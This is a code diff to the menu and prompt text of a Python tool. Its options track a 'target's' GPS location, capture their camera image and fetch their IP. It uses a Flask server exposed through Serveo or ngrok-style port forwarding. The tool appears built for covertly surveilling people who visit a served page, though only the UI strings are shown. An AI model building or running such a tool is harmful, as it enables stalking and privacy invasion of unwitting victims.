@@ -144,7 +144,7 @@ def get_url():
     return args.target
 
 def get_user_choice():
-    print(f"\n{B}[~] {C}What would you like to do?{W}\n")
+    print(f"{B}[~] {C}What would you like to do?{W}\n")
     print(f"{Y}1. {W}Track Target GPS Location")
     print(f"{Y}2. {W}Capture Target Image")
     print(f"{Y}3. {W}Fetch Target IP Address")
@@ -154,9 +154,11 @@ def get_user_choice():
     return choice
 
 def ask_port_forwarding():
-    print(f"\n{B}[~] {C}Do you want to use Serveo for port forwarding?{W}\n")
+    print(f'____________________________________________________________________________\n')
+    print(f"{B}[~] {C}Do you want to use Serveo for port forwarding?{W}\n")
     print(f"{Y}1. {W}Yes")
     print(f"{Y}2. {W}No, I will use another method")
+    print(f"\n{M}Note: {W}In windows {R}Serveo.net{W} might not work, use option 2 and port forward using tool like Ngrok or install WSL2 and some linux distro from windows store and then run the tool using their terminal.")
     choice = input(f"\n{B}[+] {Y}Enter the number corresponding to your choice: {W}")
     return choice
 
@@ -247,7 +249,10 @@ def main():
         port_forwarding_thread = threading.Thread(target=start_port_forwarding)
         port_forwarding_thread.start()
     else:
-        print(f"{R}Warning: {W}Port forwarding is necessary for the application to work on other devices. Make sure to set it up using another method.")
+        print(f'____________________________________________________________________________\n')
+        print(f"{R}Warning: {W}Port forwarding is necessary for the application to work on other devices. Make sure to set it up using another method."
+           f"{Y}ngrok, cloudflare, localhost.run etc.{W}")
+        print(f'____________________________________________________________________________\n')
     
     # Start the Flask server
     #start_message = f"{G}[+] {C}Flask server started!{W}"
